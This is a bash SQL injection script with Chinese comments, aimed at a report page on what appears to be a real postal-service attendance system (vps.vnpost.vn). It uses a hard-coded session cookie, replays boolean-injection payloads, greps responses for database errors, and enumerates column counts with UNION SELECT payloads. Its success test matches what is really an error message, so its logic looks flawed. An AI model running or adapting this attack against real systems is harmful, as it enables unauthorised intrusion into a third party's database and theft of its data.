#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 验证SQL注入 - 响应差异分析"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 读取所有候选payload
if [ -f sql_boolean_candidates.txt ]; then
    echo "[*] 发现 $(wc -l < sql_boolean_candidates.txt) 个候选payload"
    echo ""
    
    # 分析top 5
    head -5 sql_boolean_candidates.txt | while IFS='|' read payload size; do
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "🔍 Payload: $payload"
        echo "   响应大小: $size bytes"
        
        # 重新测试
        resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${payload}" \
            -H "Cookie: $COOKIE" 2>&1)
        
        actual_size=$(echo "$resp" | wc -c)
        echo "   实际大小: $actual_size bytes"
        
        # 检查SQL错误特征
        if echo "$resp" | grep -qi "SQL\|syntax\|unclosed\|quotation\|varchar\|convert\|cast"; then
            echo "   ✅ 发现SQL错误信息!"
            echo "$resp" | grep -i "SQL\|syntax\|unclosed\|quotation\|varchar\|convert\|cast" | head -10
        fi
        
        # 检查异常内容
        if echo "$resp" | grep -qi "Exception\|Error\|Stack"; then
            echo "   ⚠️  发现异常信息"
            echo "$resp" | grep -i "Exception\|Error" | head -5
        fi
    done
fi

# 测试UNION注入（响应最大的）
echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 测试UNION注入（增加列数）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

for cols in {1..10}; do
    nulls=$(printf "NULL,%.0s" $(seq 1 $cols) | sed 's/,$//')
    payload="MAU2'+UNION+SELECT+${nulls}--"
    
    echo -n "  $cols 列: "
    resp=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${payload}" \
        -H "Cookie: $COOKIE" 2>&1)
    
    size=$(echo "$resp" | wc -c)
    echo -n "$size bytes "
    
    if echo "$resp" | grep -qi "The used SELECT statements have a different number of columns"; then
        echo "- 列数不匹配"
    elif echo "$resp" | grep -qi "All queries combined using a UNION"; then
        echo "✅ 列数正确!"
        echo "$payload" > union_correct_columns.txt
        echo "$resp" > union_success_${cols}cols.html
        echo "  🔥 成功! 保存到 union_success_${cols}cols.html"
        break
    elif [ $size -gt 5000 ]; then
        echo "⚠️  响应异常大"
    else
        echo "-"
    fi
done

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 SQL注入验证完成"
